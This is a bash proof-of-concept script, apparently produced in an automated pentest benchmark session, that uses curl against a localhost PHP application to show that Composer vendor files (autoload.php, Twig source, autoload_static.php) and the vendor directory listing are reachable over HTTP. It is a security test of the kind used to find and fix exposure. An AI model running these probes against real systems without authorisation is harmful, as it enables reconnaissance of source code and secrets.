#!/bin/bash
# POC: Demonstrates unrestricted HTTP access to vendor library files and source code enumeration
# Target: ./repo
# Created: 2025-12-01T15:56:48.768Z
# Session: benchmark-XBEN-092-24-minbdcli

# Proof of Concept: Unrestricted Vendor Directory Access
# Demonstrates that PHP library files from composer packages are directly accessible via HTTP

TARGET="http://localhost:8081"
VENDOR_DIR="/vendor"

echo "=========================================="
echo "Vendor Directory Access Vulnerability POC"
echo "=========================================="
echo ""

# Test 1: Access autoload.php (core Composer file)
echo "[*] Test 1: Accessing vendor/autoload.php..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$VENDOR_DIR/autoload.php")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" == "200" ]; then
    echo "[+] SUCCESS (HTTP 200): autoload.php is accessible"
    echo "[+] File size: $(echo "$BODY" | wc -c) bytes"
    echo "[+] First 5 lines:"
    echo "$BODY" | head -n 5
else
    echo "[-] FAILED (HTTP $HTTP_CODE)"
fi
echo ""

# Test 2: Access Twig library file
echo "[*] Test 2: Accessing vendor/twig/twig/src/Environment.php..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$VENDOR_DIR/twig/twig/src/Environment.php")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" == "200" ]; then
    echo "[+] SUCCESS (HTTP 200): Twig Environment.php is accessible"
    echo "[+] File size: $(echo "$BODY" | wc -c) bytes"
    echo "[+] Contains class definition: $(echo "$BODY" | grep -c "class Environment" || echo "0")"
else
    echo "[-] FAILED (HTTP $HTTP_CODE)"
fi
echo ""

# Test 3: Access specific Twig loader implementation
echo "[*] Test 3: Accessing vendor/twig/twig/src/Loader/FilesystemLoader.php..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$VENDOR_DIR/twig/twig/src/Loader/FilesystemLoader.php")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" == "200" ]; then
    echo "[+] SUCCESS (HTTP 200): Twig FilesystemLoader.php is accessible"
    echo "[+] File size: $(echo "$BODY" | wc -c) bytes"
    echo "[+] Contains class definition: $(echo "$BODY" | grep -c "class FilesystemLoader" || echo "0")"
else
    echo "[-] FAILED (HTTP $HTTP_CODE)"
fi
echo ""

# Test 4: Access Composer autoload configuration
echo "[*] Test 4: Accessing vendor/composer/autoload_static.php..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$VENDOR_DIR/composer/autoload_static.php")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" == "200" ]; then
    echo "[+] SUCCESS (HTTP 200): Composer autoload_static.php is accessible"
    echo "[+] File size: $(echo "$BODY" | wc -c) bytes"
    echo "[+] Contains class definition: $(echo "$BODY" | grep -c "class ComposerStaticInit" || echo "0")"
else
    echo "[-] FAILED (HTTP $HTTP_CODE)"
fi
echo ""

# Test 5: Attempt vendor directory listing
echo "[*] Test 5: Attempting vendor directory listing..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$VENDOR_DIR/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" == "200" ]; then
    if echo "$BODY" | grep -q "Index of" || echo "$BODY" | grep -q "twig" || echo "$BODY" | grep -q "symfony"; then
        echo "[+] Directory listing possible (HTTP 200)"
        echo "[+] Directory contains: $(echo "$BODY" | grep -o 'href="[^"]*"' | wc -l) entries"
    fi
else
    echo "[-] Directory listing blocked (HTTP $HTTP_CODE)"
fi
echo ""

echo "=========================================="
echo "Summary:"
echo "=========================================="
echo "The vendor directory and its library files are directly accessible via HTTP."
echo "This allows attackers to:"
echo "  - Download and analyze library source code"
echo "  - Identify custom implementations"
echo "  - Discover potential vulnerabilities in specific versions"
echo "  - Extract hardcoded credentials or sensitive data"
echo "=========================================="